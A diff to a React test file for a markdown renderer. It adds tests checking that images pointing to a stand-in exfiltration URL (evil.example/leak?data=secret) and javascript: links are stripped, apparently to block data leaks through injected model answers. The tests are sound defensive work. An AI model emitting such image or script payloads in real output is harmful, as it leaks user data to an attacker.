@@ -29,7 +29,7 @@ describe('MarkdownRenderer', () => {
       root.render(<MarkdownRenderer content={markdown} />);
     });
 
-    expect(container.querySelector('h1')?.textContent).toBe('Heading 1');
+    expect(container.querySelector('h3')?.textContent).toBe('Heading 1');
     expect(container.querySelector('strong')?.textContent).toBe('bold');
     expect(container.querySelector('em')?.textContent).toBe('italic');
     expect(container.querySelector('a')?.getAttribute('href')).toBe('https://devflow.io');
@@ -45,6 +45,24 @@ describe('MarkdownRenderer', () => {
     expect(container.querySelector('script')).toBeNull();
     expect(container.querySelector('iframe')).toBeNull();
     expect(container.textContent).toContain('Hello safe world');
+  });
+
+  it('does not render images, so an injected answer cannot make the browser fetch a URL', async () => {
+    await act(async () => {
+      root.render(<MarkdownRenderer content={'![x](https://evil.example/leak?data=secret) after'} />);
+    });
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.innerHTML).not.toContain('evil.example');
+    expect(container.textContent).toContain('after');
+  });
+
+  it('drops javascript: links', async () => {
+    await act(async () => {
+      root.render(<MarkdownRenderer content={'[click](javascript:alert(1))'} />);
+    });
+
+    expect(container.querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript');
   });
 
   it('renders code blocks properly', async () => {
